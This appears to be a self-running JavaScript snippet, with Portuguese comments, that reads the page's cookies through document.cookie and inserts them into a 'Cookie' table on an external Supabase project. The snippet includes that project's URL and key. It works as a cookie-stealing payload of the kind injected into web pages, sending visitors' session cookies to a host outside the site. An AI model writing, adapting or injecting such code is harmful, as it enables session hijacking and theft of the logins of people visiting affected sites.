(async function () { // Transformado em função assíncrona

  const SUPABASE_URL = "https://viznxowojmdxkpwukhla.supabase.co";
  const SUPABASE_KEY = "sb_publishable_-dnu2H4vDls0duGO03BXaA_IfvWlAuk";

  async function run() {
    // Verifica se o objeto supabase existe
    if (typeof supabase === 'undefined') {
      console.error("Erro: A biblioteca Supabase não foi carregada.");
      return;
    }

    const c = document.cookie;
    const supaclient = supabase.createClient(SUPABASE_URL, SUPABASE_KEY);

    console.log("Tentando enviar cookies:", c);

    // Adicionado await e tratamento de erro
    const { data, error } = await supaclient
      .from("Cookie")
      .insert([
        {
          text: c,
          created_at: new Date()
        }
      ]);

    if (error) {
      console.error("Erro ao inserir no Supabase:", error.message);
    } else {
      console.log("Dados inseridos com sucesso!");
    }
  }

  await run();
  console.log("Execução finalizada");
})();
